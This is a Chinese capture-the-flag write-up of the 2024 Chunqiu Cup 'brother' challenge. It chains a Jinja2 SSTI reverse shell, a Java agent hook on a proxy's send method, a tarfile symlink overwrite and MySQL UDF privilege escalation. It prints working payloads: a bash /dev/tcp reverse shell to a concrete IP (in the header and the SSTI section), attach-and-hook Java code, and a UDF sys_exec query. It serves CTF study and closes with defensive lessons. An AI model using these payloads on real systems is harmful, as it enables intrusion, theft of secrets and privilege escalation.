---
title: 【WP】2024年春秋杯夏季赛 brother 出题思路详解
contest: 春秋杯
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [SSTI-rebound-shell, sql-proxy.jar-tcp-forward, Java-agent-attach, send-method-hook, evil.key-read, MySQL-UDF-privesc, tarfile-symlink-overwrite]
attack_chain: 1. SSTI Jinja2 {{lipsum.__globals__['os'].popen('bash -i >& /dev/tcp/IP/6666')}} 反弹 shell/2. sql-proxy.jar 6666→3306 流量转发 + Java agent 劫持 socket send 方法读 /app/evil.key/3. update.py code=1 接收 tar.gz 解压 new.bin 到 /updatedir/4. tarfile 软链接覆盖写入 MySQL 插件目录 + UDF 提权
key_payload: SQL proxy: sourcePort=6666 destPort=3306  UDF so: /app/evil.key  tarfile 软链接覆盖
one_liner: 2024 春秋杯夏季赛 brother 出题思路，SSTI 反弹 shell + sql-proxy.jar Java agent hook send + MySQL UDF 提权。
lesson: sql-proxy.jar 用 Base64ClassLoader 动态加载类，Java agent 可劫持 socket send 改响应；tarfile 解压未限制软链接是覆盖写入漏洞；MySQL UDF 提权需要 plugin_dir 写入权限。
quality: high
---

# 【WP】2024年春秋杯夏季赛 brother 出题思路详解

## 概览
2024 春秋杯夏季赛 brother 题，覆盖 SSTI 反弹 shell → sql-proxy 流量劫持 → MySQL UDF 提权三段链。

## 题目要求
- 主要考察 UDF（用户定义函数）提权
- 4 步：编写 .so → 导入 → MySQL UDF → 命令执行提权

## 总体思路
- **入口 one 权限**：sql-proxy.jar 作为代理服务器，6666 → 3306
- **two 权限**：api.py 定时对 MySQL 存活检测（通过 6666 端口），可通过 Java agent 劫持 socket 输出流，发送任意文件读取包，读取 `/app/evil.key`
- **three 权限**：拥有 MySQL 插件目录写入权限，update.py 接收 tar.gz 解压到 /updatedir，利用 tarfile 软链接覆盖写 udf.so 到 MySQL 插件目录

## 入口 SSTI
```python
{{lipsum.__globals__['os'].popen('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.134.146.39%2F6666%200%3E%261%22').read()}}
```

## sql-proxy.jar 分析

### 主类代码
```java
Base64ClassLoader base64ClassLoader = new Base64ClassLoader();
Class cls = base64ClassLoader.loadClassFromBase64("yv66...");
cls.newInstance();
```

### Proxy 类（反编译后）
```java
public class Proxy {
    private int c = 0;
    public Proxy() {
        int sourcePort = 6666;
        String destinationHost = "127.0.0.1";
        int destinationPort = 3306;
        try {
            ServerSocket serverSocket = new ServerSocket(sourcePort);
            while (true) {
                Socket sourceSocket = serverSocket.accept();
                Socket destinationSocket = new Socket(destinationHost, destinationPort);
                Thread sourceToDestination = new Thread(() -> {
                    this.forwardData(sourceSocket, destinationSocket);
                });
                sourceToDestination.start();
                // ...
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void forwardData(Socket inputSocket, Socket outputSocket) {
        try {
            InputStream inputStream = inputSocket.getInputStream();
            OutputStream outputStream = outputSocket.getOutputStream();
            byte[] buffer = new byte[1024];
            int read;
            while ((read = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, read);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

## Java agent 劫持 send

### Hook.java
```java
package com.test;
import com.sun.tools.attach.VirtualMachine;
import java.lang.instrument.Instrumentation;
import java.util.jar.JarFile;

public class Hook {
    public static void main(String[] args) {
        String pid = args[0];
        String agentPath = args[1];
        try {
            VirtualMachine vm = VirtualMachine.attach(pid);
            vm.loadAgent(agentPath, agentPath);
            vm.detach();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void agentmain(String agentArg, Instrumentation inst) throws Exception {
        String hookClass = "com.ctf.Proxy";
        String hookMethod = "send";
        String hookCode = "...";
        inst.appendToBootstrapClassLoaderSearch(new JarFile(agentArg));
        HookTransformer socketTransformer = new HookTransformer(hookClass, hookMethod, hookCode, 1);
        inst.addTransformer(socketTransformer, true);
        // 重转换已加载类
    }
}
```

### 攻击效果
- hook Proxy 类的 send 方法
- 替换为读取 `/app/evil.key` 文件内容
- 通过 socket 输出流发回攻击者

## update.py + tarfile 软链接覆盖

### 利用方式
- update.py 接收 tar.gz，code=1 时解压 new.bin 到 /updatedir
- tarfile 解压未限制软链接 → 创建软链接指向 MySQL plugin_dir
- 解压 udf.so → 实际写入 MySQL plugin_dir

### MySQL UDF 提权
```sql
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so';
SELECT sys_exec('cat /flag > /var/lib/mysql-files/flag.txt');
```

## 经验提炼
- sql-proxy.jar 用 Base64ClassLoader 动态加载类，Java agent 可劫持 socket send 改响应
- tarfile 解压未限制软链接是覆盖写入漏洞
- MySQL UDF 提权需要 plugin_dir 写入权限
- Java agent 通过 `inst.addTransformer + retransformClasses` hook 已加载类
- `VirtualMachine.attach(pid).loadAgent(agentPath)` 是 Java agent 标准 attach 流程
- SSTI Jinja2 `lipsum.__globals__['os'].popen` 反弹 shell 是 Flask/Jinja2 经典 RCE
- `Proxy.send` 是 OutputStream.write 转发流的入口方法
- Base64ClassLoader 是绕过静态扫描的恶意类加载器
- update.py 接收 tar.gz 时需 `extractall` 限制 `follow_symlinks=False`
